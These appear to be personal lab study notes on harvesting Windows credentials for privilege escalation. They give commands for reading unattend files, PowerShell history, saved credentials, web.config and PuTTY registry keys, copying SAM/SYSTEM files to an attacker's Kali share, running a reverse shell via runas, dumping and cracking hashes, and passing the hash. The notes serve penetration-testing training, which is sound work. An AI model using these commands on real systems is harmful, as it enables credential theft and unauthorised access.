<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Passwords</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Passwords</h1><br/><p><strong><h2>Harvesting Passwords from Usual Spots</h2></strong></p><p></p><p><strong><h3>A) Unattended Windows Installations:</h3></strong></p><p></p><p>When installing Windows on a large number of hosts, administrators  may use Windows Deployment Services, which allows for a single operating  system image to be deployed to several hosts through the network. These  kinds of installations are referred to as unattended installations as  they don&#39;t require user interaction. Such installations require the use  of an administrator account to perform the initial setup, which might  end up being stored in the machine in the following locations:</p><p></p><p>• C:\Unattend.xml</p><p>• C:\Windows\Panther\Unattend.xml</p><p>• C:\Windows\Panther\Unattend\Unattend.xml</p><p>• C:\Windows\system32\sysprep.inf</p><p>• C:\Windows\system32\sysprep\sysprep.xml</p><p></p><p>As part of these files, you might encounter credentials:</p><p><code>&lt;Credentials&gt;</code></p><p><code>    &lt;Username&gt;Administrator&lt;/Username&gt;</code></p><p><code>    &lt;Domain&gt;thm.local&lt;/Domain&gt;</code></p><p><code>    &lt;Password&gt;MyPassword123&lt;/Password&gt;</code></p><p><code>&lt;/Credentials&gt;</code></p><p></p><p></p><p><strong><h3>B) Powershell History:</h3></strong></p><p></p><p>Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a <strong>cmd.exe</strong> prompt:</p><p></p><p><em>Cmd</em></p><p><strong>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</strong></p><p></p><p>Note: The command above will only work from <strong>cmd.exe</strong>, as <strong>Powershell</strong> won&#39;t recognize <strong>%userprofile%</strong> as an <strong>environment variable</strong>. To read the file from <strong>Powershell</strong>, you&#39;d have to <strong>replace</strong> <strong>%userprofile%</strong> with <strong>$Env:userprofile</strong>. </p><p></p><p><em>Powershell</em></p><p><strong>type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</strong></p><p></p><p><strong>Example:</strong></p><p><img src="images/210-1.png" alt="images/210-1.png" /></p><p></p><p><strong><h3>C) Saved Windows Credentials:</h3></strong></p><p></p><p>Windows allows us to use other users&#39; credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:</p><p></p><p><strong>cmdkey /list</strong></p><p></p><p>While you can&#39;t see the actual passwords, if you notice any credentials worth trying, you can use them with the <strong>runas</strong> command and the <strong>/savecred</strong> option, as seen below.</p><p></p><p><strong>runas /savecred /user:admin cmd.exe</strong></p><p></p><p><strong>Example:</strong></p><p><img src="images/210-2.png" alt="images/210-2.png" /></p><p></p><p>Or To run a reverse shell.</p><p></p><p></p><p>List any saved credentials:</p><p></p><p><strong>cmdkey /list</strong></p><p></p><p>Note that credentials for the &quot;admin&quot; user are saved. If they aren&#39;t, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.</p><p></p><p>Start a listener on Kali and run the reverse.exe executable using runas with the admin user&#39;s saved credentials:</p><p></p><p><strong>runas /savecred /user:admin C:\PrivEsc\reverse.exe</strong></p><p></p><p></p><p><strong><h3>D) IIS Configuration:</h3></strong><h3> </h3></p><p></p><p>Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find <strong>web.config</strong> in one of the following locations:</p><p></p><p>    <strong>C:\inetpub\wwwroot\web.config</strong></p><p><strong>    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</strong></p><p></p><p>Here is a quick way to find database connection strings on the file:</p><p></p><p><strong>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</strong></p><p></p><p><strong>Example:</strong></p><p><img src="images/210-3.png" alt="images/210-3.png" /></p><p></p><p><strong><h3>E) Retrieve Credentials for Softwares - Putty:</h3></strong></p><p></p><p>PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection&#39;s parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won&#39;t allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.</p><p></p><p>To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:</p><p></p><p><strong>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</strong></p><p></p><p>Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.</p><p></p><p>Just as putty stores credentials, any software that stores passwords, including <strong>browsers</strong>, <strong>email clients</strong>, <strong>FTP clients</strong>, <strong>SSH clients</strong>, <strong>VNC</strong> software and others, will have methods to recover any passwords the user has saved.</p><p></p><p><strong>Example:</strong></p><p><img src="images/210-4.png" alt="images/210-4.png" /></p><p></p><p></p><p><strong><h2>F) Security Access Manager (SAM)</h2></strong></p><p></p><p>The <strong>SAM</strong> and <strong>SYSTEM</strong> files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the <strong>C:\Windows\Repair\</strong> directory.</p><p></p><p>Transfer the <strong>SAM</strong> and <strong>SYSTEM</strong> files to your Kali VM (Using smbserver): </p><p></p><p><strong>copy C:\Windows\Repair\SAM \\10.10.10.10\kali\</strong></p><p><strong>copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\</strong></p><p></p><p>On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:</p><p></p><p><strong>git clone https://github.com/Tib3rius/creddump7</strong></p><p><strong>pip3 install pycrypto</strong></p><p><strong>python3 creddump7/pwdump.py SYSTEM SAM</strong></p><p></p><p><strong>Note: </strong>The above is having issues with new version of python. (Will try in next update)</p><p></p><p>Or</p><p></p><p>Use Impacket-Secretdump to get the hashes</p><p></p><p><strong>impacket-secretsdump -sam SAM -system SYSTEM LOCAL</strong></p><p><img src="images/210-5.png" alt="images/210-5.png" /></p><p></p><p>Crack the admin NTLM hash using hashcat:</p><p></p><p><strong>hashcat -m 1000 --force &lt;hash&gt; /usr/share/wordlists/rockyou.txt</strong></p><p></p><p>You can use the cracked password to log in as the admin using winexe or RDP.</p><p></p><p></p><p><strong><h2>G) Passing The Hash</h2></strong></p><p></p><p>Why crack a password hash when you can authenticate using the hash?</p><p></p><p>Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:</p><p></p><p><strong>pth-winexe -U &#39;admin%hash&#39; //10.10.59.176 cmd.exe</strong></p><p></p><p><strong>Important Note:</strong> Similar to <strong>impacket-psexec</strong>, we need to give the full hash value ie. <strong>LM_Hash:NTLM_Hash</strong></p><p>eg. hash to supply for user <strong>admin</strong> : <strong>aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da</strong></p><p></p><p><strong>Example:</strong></p><p><img src="images/210-6.png" alt="images/210-6.png" /></p><p></p><p><strong><h2>END</h2></strong></p><p></p><p></p></div>
</body>
</html>
